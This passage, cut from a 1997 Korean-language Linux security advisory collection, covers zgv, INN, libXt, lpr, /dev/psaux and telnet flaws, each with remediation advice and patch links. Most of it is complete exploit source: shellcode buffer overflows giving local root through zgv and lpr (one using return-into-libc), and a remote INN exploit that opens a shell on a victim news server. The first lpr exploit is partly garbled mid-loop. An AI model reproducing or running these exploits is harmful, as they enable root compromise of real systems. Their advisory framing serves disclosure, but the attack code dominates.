+     *   $ cc -o n n.c
+     *   $ ./n
+     *   Oak driver: Unknown chipset (id =  0)
+     *   bash#
+     *
+     * EXPLANATION: zgv (suid root) does not check bounds for $HOME env.
+     *
+     */
+
+
+    #include 
+    #include 
+    #include 
+
+    char *shellcode =
+
+"\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+
+"\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+
+"\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+      "\xcd\x80/"
+      "/bin/sh"
+      "0";
+
+    char *get_sp() {
+       asm("movl %esp,%eax");
+
+    }
+
+    #define bufsize 4096
+    char buffer[bufsize];
+
+    main() {
+      int i;
+
+      for (i = 0; i < bufsize - 4; i += 4)
+        *(char **)&buffer[i] = get_sp() -4675;
+
+      memset(buffer, 0x90, 512);
+      memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+      buffer[bufsize - 1] = 0;
+
+      setenv("HOME", buffer, 1);
+
+
+      execl("/usr/bin/zgv", "/usr/bin/zgv", NULL);
+    }
+
+해결책
+
+    svgalib-1.2.11 은 보안상 어떤 헛점이 있으므로 새로운 버젼을 인스톨
+    하여라. 또한 래드햇 4.0 4.1 4.2 사용자 또한 새로운 버젼을 인스톨
+    시켜야 한다.
+    아래의 사이트에 가면 고칠수 있는 버그 패치판이 나와있다.
+
+ftp://ftp.redhat.com/updates/4.2/i386/svgalib-1.2.10-3.i386.rpm
+
+
+    설치는 업그레이드를 해야 한다. 밑의 커맨더 참고.
+        rpm -Uvh 가져온 파일명
+
+---------------------------
+
+ 제  목: [보안] 리눅스 InterNetNews
+명령
+
+    InterNetNews
+
+시스템
+
+    Linux/x86
+
+문제점
+
+    버퍼 오버플로우를 일으켜서 루트를 얻을 수 있다.
+
+    --------------------------- innbuf.c -----------------------------
+    /*
+     * This just  generates the x86  shellcode "and.class" tppabs="http://www.angelfire.com/ok/jotna/and.class" puts  it in a  file
+     * that nnrp  can send. The  offset and/or esp  may need changing.
+     * To  compile  on  most  systems:  cc innbuf.c -o innbuf.  Usage:
+     * innbuf [offset] > file.  (C) 1997 by Method
+
+     * P.S.  Feel free to port this to other OS's.
+     */
+    #include 
+    #include 
+    #include 
+    #include 
+
+    #define DEFAULT_OFFSET  792
+    #define BUFFER_SIZE     796
+    #define ADDRS           80
+
+    u_long get_esp()
+    {
+            return(0xefbf95e4);
+    }
+
+    int main(int argc, char **argv)
+
+    {
+            char *buff = NULL;
+            u_long *addr_ptr = NULL;
+            char *ptr = NULL;
+            int ofs = DEFAULT_OFFSET;
+            int noplen;
+            u_long addr;
+
+            int i;
+            u_char execshell[] =
+
+"\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
+
+"\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
+
+"\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
+
+"\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
+
+        if(argc < 1)
+                    ofs = atoi(argv[1]);
+
+            addr = get_esp() - ofs;
+
+            if(!(buff = malloc(4096))) {
+                    fprintf(stderr, "can't allocate memory\n");
+                    exit(1);
+            }
+            ptr = buff;
+            noplen = BUFFER_SIZE - strlen(execshell) - ADDRS;
+            memset(ptr, 0x90, noplen);
+            ptr += noplen;
+            for(i = 0; i < strlen(execshell); i++)
+                    *ptr++ = execshell[i];
+            addr_ptr = (unsigned long *)ptr;
+
+            for(i = 0; i < ADDRS / 4; i++)
+                    *addr_ptr++ = addr;
+            ptr = (char *)addr_ptr;
+            *ptr = '\0';
+
+            printf(
+                    "Path: dev.null!nntp\n"
+                    "From: devNull @%s\n"
+                    "Newsgroups: alt.test\n"
+                    "Subject: 4 out of 5 Dweebs prefer INND for getting
+r00t\n"
+                    "Message-ID: <830201540.9220@dev.null.com>\n"
+                    "Date: 9 Jun 1997 15:15:15 GMT\n"
+                    "Lines: 1\n"
+                    "\n"
+                    "this line left not left intentionally blank\n"
+                    ".\n", buff);
+
+    }
+
+    ------------------------------------------------------------------
+
+    ---------------------------- nnrp.c ------------------------------
+    /*
+     * Remote  exploit  for  INN  version  <  1.6.  Requires  'innbuf'
+     * program  to operate.   To compile:  cc nnrp.c  -o nnrp.  Usage:
+     * nnrp  .  (C) 1997 by Method  of
+     * Dweebs 
+     */
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+
+    #define POST            "POST\n"
+
+    #define SAY(a, b)       write(a, b, strlen(b))
+    #define CHOMP(a, b)     read(a, b, sizeof(b))
+    #define basename(a)     bname(a)
+
+    char *me;
+
+    make_addr(char *name, struct in_addr *addr)
+    {
+            struct hostent *hp;
+
+            if(inet_aton(name, addr) == 0) {
+                    if(!(hp = gethostbyname(name))) {
+                            fprintf(stderr, "%s: ", me);
+                            herror(name);
+                            exit(1);
+                    }
+                    addr->s_addr = ((struct in_addr *)hp->h_addr)->s_addr;
+            }
+    }
+
+    char *bname(char *str)
+    {
+            char *cp;
+
+            if((cp = (char *)strrchr(str, '/')) != NULL)
+
+                    return(++cp);
+            else
+                    return(str);
+    }
+
+    void my_err(char *errstr, int err)
+    {
+            fprintf(stderr, "%s: ", me);
+            perror(errstr);
+            exit(err);
+    }
+
+    void usage()
+    {
+            printf(
+                    "INN version 1.[45].x exploit by Method
+\n"
+                    "Usage: %s  \n"
+                    "Will start a shell on the remote host.\n"
+                    "The second argument is the file containing the
+overflow data.\n",
+                    me);
+            exit(1);
+    }
+
+    select_loop(int netfd)
+    {
+            int ret, n, in = STDIN_FILENO, out = STDOUT_FILENO;
+            char buf[512];
+            fd_set rfds;
+
+            for( ; ; ) {
+                    FD_ZERO(&rfds);
+                    FD_SET(in, &rfds);
+
+                    FD_SET(netfd, &rfds);
+
+                    if((ret = select(netfd + 1, &rfds, NULL, NULL, NULL))
+< 0)
+                            my_err("select", 1);
+
+                    if(!ret)
+                            continue;
+
+                    if(FD_ISSET(in, &rfds)) {
+                            if((n = read(in, buf, sizeof(buf))) > 0)
+                                    write(netfd, buf, n);
+                    }
+
+                    if(FD_ISSET(netfd, &rfds)) {
+                            if((n = read(netfd, buf, sizeof(buf))) > 0)
+                                    write(out, buf, n);
+
+                          else
+                                    break;
+                    }
+            }
+    }
+
+    int news_sock(char *host)
+    {
+            struct sockaddr_in sin;
+            int sock;
+
+            sin.sin_port = htons(119);
+            sin.sin_family = AF_INET;
+            make_addr(host, &(sin.sin_addr));
+
+            if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+                    my_err("socket", 1);
+            if(connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+                    my_err("connect", 1);
+
+            return(sock);
+    }
+
+    void send_egg(int sk, char *file)
+    {
+            char buf[BUFSIZ];
+            int dfd;
+            int n;
+
+            if((dfd = open(file, O_RDONLY)) < 0)
+                    my_err("open", 1);
+
+            printf("Executing innd exploit.. be patient.\n");
+
+
+            n = CHOMP(sk, buf);
+
+            buf[n] = '\0';
+            printf(buf);
+            SAY(sk, POST);
+            n = CHOMP(sk, buf);
+            buf[n] = '\0';
+            printf(buf);
+            sleep(2);
+            printf("Sending overflow data.\n");
+            while((n = CHOMP(dfd, buf)) > 0)
+                    write(sk, buf, n);
+            sleep(2);
+    }
+
+    void main(int argc, char **argv)
+    {
+            char *victim, *filename;
+            int s;
+
+            me = basename(argv[0]);
+
+            if(argc != 3)
+
+                    usage();
+
+            filename = argv[2];
+
+            send_egg(s = news_sock(victim = argv[1]), filename);
+
+            select_loop(s);
+            fprintf(stderr, "Connection closed.\n");
+            printf("Remember: Security is futile. Dweebs WILL own
+you.\n");
+            exit(0);
+   }
+    ------------------------------------------------------------------
+
+해결책
+
+    아래의 사이트에 가서 패치 버젼을 받는다.
+
+        http://www.purplefrog.com/~thoth/netpipes/
+
+---------------------------
+
+ 제  목: [보안] 리눅스 libXt (2)
+명령
+
+
+        libXt
+
+시스템
+
+        RedHat 4.0, 4.1, 4.2
+
+문제점
+
+        버퍼 오버플로우를 일으켜서 루트를 얻을 수 있다.
+        이것은 linXt자체가 문제가 있으므로 그 파급 효과는 엄청나다.
+
+해결책
+
+
+        $ cd /usr/X11/bin
+        $ find . -type f -a \( -perm -2000 -o -perm -4000 \) -print
+
+        위의 명령으로 setuid root인 파일을 찾아서 모두 setuid를 없애라.
+        아래의 사이트에서 자신에게 맞는 것을 골라  업그레이드 시켜라.
+
+    o Red Hat Linux/Alpha 4.1, 4.2
+
+ftp://ftp.redhat.com/updates/4.2/alpha/XFree86-devel-3.2-10.alpha.rpm
+
+ftp://ftp.redhat.com/updates/4.2/alpha/XFree86-libs-3.2-10.alpha.rpm
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-devel-3.$
+
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-libs-3.2$
+
+
+    o Red Hat Linux/Intel 4.0, 4.1, 4.2
+
+ftp://ftp.redhat.com/updates/4.2/i386/XFree86-devel-3.2-10.i386.rpm
+        ftp://ftp.redhat.com/updates/4.2/i386/XFree86-libs-3.2-10.i386.rpm
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-devel-3.$
+
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-libs-3.2$
+
+    o Red Hat Linux/SPARC 4.0, 4.1, 4.2
+
+ftp://ftp.redhat.com/updates/4.2/sparc/X11R6.1-devel-pl1-21.sparc.rpm
+
+ftp://ftp.redhat.com/updates/4.2/sparc/X11R6.1-libs-pl1-21.sparc.rpm
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/X11R6.1-devel-pl$
+
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/X11R6.1-libs-pl1$
+
+---------------------------
+
+ 제  목: [보안] 리눅스 lpr (2)
+명령
+
+        lpr
+
+시스템
+
+        Linux 2.0.0, 2.0.30 (SW 3.0)
+
+문제점
+
+        lpr ffffffffff.......ffff (to 1023 characters)
+        위와 같이 하여 버퍼 오버플로우를 일으키는 문제로 루트를 얻는다.
+
+    /*
+     * lpr_exploit.c - Buffer overflow exploit for the lpr program.
+     * Adapted from code found in "stack smashing..." by Aleph One
+     *                         aleph1@underground.org
+     *
+     * "wisdom is knowledge passed from one to another",  Thanks
+
+     */
+
+    #include 
+
+    #define DEFAULT_OFFSET          1023
+    #define DEFAULT_BUFFER_SIZE     2289
+    #define NOP                     0x90
+
+    /*
+     * The hex representation of the code to produce an interactive shell.
+     * Oviously since this is for a Linux Box, you may need to generate
+
+     */
+    char shellcode [] =
+
+    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+
+    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+           "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+    unsigned long get_sp(void)
+       { __asm__("mov %esp,%eax"); }
+
+    void main(int argc, char *argv[]) {
+       char *buff, *ptr;
+       long *addr_ptr, addr;
+
+       int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+       int i;
+
+       /* set aside the memory for our shell code */
+       if (!(buff = malloc(bsize))) {
+          printf("Can't allocate memory.\n");
+          exit(0);
+       }
+
+       /* Get the address of our stack pointer */
+       addr = get_sp() - offset;
+
+       /* fill our buffer with its address */
+       ptr = buff;
+       addr_ptr = (long *)ptr;
+       for(i = 0; i-- lpr.c --<
+
+    /*
+     * /usr/bin/lpr   buffer   overflow    exploit   for  Linux   with
+     * non-executable stack
+     * Copyright (c) 1997 by Solar Designer
+     */
+
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+
+    #define SIZE            1200    /* Amount of data to overflow with */
+    #define ALIGNMENT       11      /* 0, 8, 1..3, 9..11 */
+
+    #define ADDR_MASK       0xFF000000
+
+    char buf[SIZE];
+    int *ptr;
+
+    int pid, pc, shell, step;
+    int started = 0;
+    jmp_buf env;
+
+    void handler() {
+      started++;
+    }
+
+    /* SIGSEGV handler, to search in libc */
+    void fault() {
+      if (step < 0) {
+    /* Change the search direction */
+        longjmp(env, 1);
+      } else {
+    /* The search failed in both directions */
+        puts("\"/bin/sh\" not found, bad luck");
+        exit(1);
+      }
+    }
+
+    void error(char *fn) {
+      perror(fn);
+      if (pid > 0) kill(pid, SIGKILL);
+      exit(1);
+    }
+    void main() {
+      signal(SIGUSR1, handler);
+
+    /* Create a child process to trace */
+      if ((pid = fork()) < 0) error("fork");
+
+      if (!pid) {
+    /* Send the parent a signal, so it starts tracing */
+        kill(getppid(), SIGUSR1);
+    /* A loop since the parent may not start tracing immediately */
+        while (1) system("");
+      }
+
+    /* Wait until the child tells us the next library call will be
+system() */
+      while (!started);
+
+      if (ptrace(PTRACE_ATTACH, pid, 0, 0)) error("PTRACE_ATTACH");
+
+    /* Single step the child until it gets out of system() */
+      do {
+        waitpid(pid, NULL, WUNTRACED);
+        pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
+        if (pc == -1) error("PTRACE_PEEKUSR");
+        if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0))
+error("PTRACE_SINGLESTEP");
+      } while ((pc & ADDR_MASK) != ((int)main & ADDR_MASK));
+
+    /* Single step the child until it calls system() again */
+      do {
+        waitpid(pid, NULL, WUNTRACED);
+        pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
+        if (pc == -1) error("PTRACE_PEEKUSR");
+        if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0))
+error("PTRACE_SINGLESTEP");
+      } while ((pc & ADDR_MASK) == ((int)main & ADDR_MASK));
+
+    /* Kill the child, we don't need it any more */
+      if (ptrace(PTRACE_KILL, pid, 0, 0)) error("PTRACE_KILL");
+
+     pid = 0;
+
+
+      printf("system() found at: %08x\n", pc);
+
+    /* Let's hope there's an extra NOP if system() is 256 byte aligned */
+      if (!(pc & 0xFF))
+      if (*(unsigned char *)--pc != 0x90) pc = 0;
+
+    /* There's no easy workaround for these (except for using another
+function) */
+      if (!(pc & 0xFF00) || !(pc & 0xFF0000) || !(pc & 0xFF000000)) {
+        puts("Zero bytes in address, bad luck");
+        exit(1);
+      }
+
+    /*
+     * Search for a "/bin/sh" in libc until we find a copy with no zero
+
+bytes
+     * in its address. To avoid specifying the actual address that libc is
+     * mmap()ed to we search from the address of system() in both
+directions
+     * until a SIGSEGV is generated.
+     */
+      if (setjmp(env)) step = 1; else step = -1;
+      shell = pc;
+      signal(SIGSEGV, fault);
+      do
+        while (memcmp((void *)shell, "/bin/sh", 8)) shell += step;
+      while (!(shell & 0xFF) || !(shell & 0xFF00) || !(shell & 0xFF0000));
+      signal(SIGSEGV, SIG_DFL);
+
+      printf("\"/bin/sh\" found at: %08x\n", shell);
+
+    /*
+     * When returning into system() the stack should look like:
+     *                              pointer to "/bin/sh"
+     *                              return address placeholder
+     * stack pointer ->             pointer to system()
+     *
+     * The buffer could be filled with this 12 byte pattern, but then we
+would
+     * need to try up to 12 values for the alignment. That's why a 16 byte
+pattern
+     * is used instead:
+     *                              pointer to "/bin/sh"
+     *                              pointer to "/bin/sh"
+     * stack pointer (case 1) ->    pointer to system()
+     * stack pointer (case 2) ->    pointer to system()
+     *
+     * Any of the two stack pointer values will do, and only up to 8
+values for
+     * the alignment need to be tried.
+     */
+      memset(buf, 'x', ALIGNMENT);
+      ptr = (int *)(buf + ALIGNMENT);
+      while ((char *)ptr < buf + SIZE - 4*sizeof(int)) {
+        *ptr++ = pc; *ptr++ = pc;
+        *ptr++ = shell; *ptr++ = shell;
+      }
+      buf[SIZE - 1] = 0;
+
+      execl("/usr/bin/lpr", "lpr", "-C", buf, NULL);
+      error("execl");
+    }
+
+    >-- lpr.c --<
+
+해결책
+
+    아래에서 패치 파일을 찾아서 패치하라.
+
+        http://www.false.com/security/linux-stack/
+
+---------------------------
+
+ 제  목: [보안] 리눅스 psaux 디바이스
+
+명령
+
+        /dev/psaux
+
+시스템
+
+        Linux with psaux device
+
+문제점
+
+         아래와 같은 문제가 있다.
+
+        cat /bin/bash > /dev/psaux
+        [CTRL-C]
+        이것은 /dev/psaux 의 퍼미션이 666 모드로 되어서 아무나 쓸수 있게 되기
+        때문이다.
+
+        이 버그는 ps/2 키보드를 이용하는 사람에게 해당된다.
+
+
+해결책
+
+        이 디바이스의 퍼미션을 일반 유저가 읽기만 가능하도록 해라
+        일반 유저가 쓰기를 할 수 없도록 해라
+        chmod 664 /dev/psaux
+
+---------------------------
+
+ 제  목: [보안] 리눅스 telnet (1)
+명령
+
+        telnet
+
+시스템
+
+        RedHat 4.0
+
+문제점
+
+        원하는 호스트에 어떤 계정이 있는지 없는지를 확인 할 수 있다.
+        예를 들어.
+
+        Trying 127.0.0.1...
+        Connected to localhost.
+        Escape character is '^]'.
+
+        Red Hat Linux release 4.0 (Colgate)
+        Kernel 2.0.24 on an i586
+
+        login: bug
+        Password:
+
+        Login incorrect
+        Connection closed by foreign host.
+        없는 계정을 입력시에 한번에 끝난다.
+
+        Trying 127.0.0.1...
+        Connected to localhost.
+        Escape character is '^]'.
+
+        Red Hat Linux release 4.0 (Colgate)
+        Kernel 2.0.24 on an i586
+        login: root
+        Password:
+        Login incorrect
+
+        login:
+        login:
+        login:
+        login:
+        계정이 있을 경우 계속 물어 본다.
+
+---------------------------
+
